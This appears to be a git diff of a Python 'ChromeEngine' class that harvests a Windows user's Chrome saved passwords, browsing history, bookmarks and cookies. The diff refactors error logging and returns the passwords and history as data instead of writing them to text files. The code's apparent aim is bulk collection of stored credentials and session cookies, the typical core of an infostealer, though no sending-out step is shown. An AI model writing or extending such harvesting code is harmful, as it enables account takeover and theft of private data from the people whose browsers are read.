@@ -12,7 +12,8 @@ import erros as err
 import datetime
 
 class ChromeEngine:
-    def __init__(self,where_to_save):
+    def __init__(self):
+        self.name = "chrome"
         chrome_path = os.path.expanduser('~') + "\AppData\Local\Google\Chrome\User Data\Default"
         if not ut.file_exists(chrome_path):
             self.is_valid = False
@@ -56,36 +57,22 @@ class ChromeEngine:
     def get_chrome_saved_password(self):
         info = chrome_password.get_chrome_saved_password()
         if info[0] == 'err':
-            f = open('/logs/chrome_erros.txt', 'a')
-            f.write("-----------------\r\n" + str(datetime.datetime.now()) + "\r\n" + err.errs[info[1]] + " - " + info[2])
-            f.close()
+            err.error_handle([info[1:]], self.name)
         else:
             self.info_bank['passwords'] = info
-            f = open(self.dir_path + 'saved_password.txt','w')
-            st = ""
-            for i in self.info_bank['passwords']:
-                st += "site: " + i[0] + " User: " + i[1] + " Password: " + i[2] + "\r\n"
-            f.write(st)
-            f.close()
+            return info
 
     def get_chrome_history(self):
         info = chrome_history.get_chrome_history()
         if info[0] == 'err':
-            f = open('/logs/chrome_erros.txt', 'a')
-            f.write("-----------------\r\n" + str(datetime.datetime.now()) + "\r\n" + err.errs[info[1]] + " - " + info[2])
-            f.close()
+            err.error_handle([info[1:]], self.name)
         else:
             self.info_bank['history'] = info
-            f = open(self.dir_path + 'history.txt','w')
-            f.write(str(self.info_bank['history'][0]))
-            f.close()
-
+            return info[0]
     def get_chrome_bookmarks(self):
         info = chrome_bookmarks.get_bookmarks()
         if info[0] == 'err':
-            f = open('/logs/chrome_erros.txt', 'a')
-            f.write("-----------------\r\n" + str(datetime.datetime.now()) + "\r\n" + err.errs[info[1]] + " - " + info[2])
-            f.close()
+            err.error_handle([info[1:]], self.name)
         else:
             self.info_bank['bookmarks'] = info
             f = open(self.dir_path + 'bookmarks.txt','w')
@@ -96,9 +83,7 @@ class ChromeEngine:
     def get_cookies(self):
         info = chrome_coockie.get_all_cookies()
         if info[0] == 'err':
-            f = open('/logs/chrome_erros.txt', 'a')
-            f.write("-----------------\r\n" + str(datetime.datetime.now()) + "\r\n" + err.errs[info[1]] + " - " + info[2])
-            f.close()
+            err.error_handle([info[1:]], self.name)
         else:
             self.info_bank['cookies'] = info
             f = open(self.dir_path + 'cookies.txt', 'w')
